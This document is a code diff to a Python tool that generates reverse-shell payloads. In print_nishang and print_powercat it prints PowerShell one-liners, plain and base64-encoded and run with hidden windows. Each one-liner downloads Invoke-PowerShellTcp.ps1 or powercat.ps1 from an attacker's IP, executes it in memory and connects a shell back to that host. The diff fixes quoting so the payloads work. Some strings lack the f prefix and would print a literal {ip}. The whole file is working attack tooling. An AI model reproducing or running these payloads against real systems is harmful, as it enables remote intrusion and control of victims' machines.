@@ -70,18 +70,18 @@ def print_nishang(ip, port):
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** Nishang Download & IEX **********\n")
-    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1")
+    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1')")
 
     print("\n********** Nishang Download & IEX b64 **********\n")
-    payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1"
+    payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1')"
     p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** Nishang Download & Execution **********\n")
-    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}")
+    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}")
 
     print("\n********** Nishang Download & Execution b64 **********\n")
-    payload = f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
+    payload = f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
     p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
@@ -99,18 +99,18 @@ def print_powercat(ip, port):
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** PowerCat Download & IEX **********\n")
-    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1")
+    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1')")
 
     print("\n********** PowerCat Download & IEX b64 **********\n")
-    payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1"
+    payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1')"
     p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** PowerCat Download & Execution **********\n")
-    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1; powercat -c {ip} -p {port} -e powershell")
+    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1'); powercat -c {ip} -p {port} -e powershell")
 
     print("\n********** PowerCat Download & Execution b64 **********\n")
-    payload = f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1; powercat -c {ip} -p {port} -e powershell"
+    payload = f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1'); powercat -c {ip} -p {port} -e powershell"
     p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
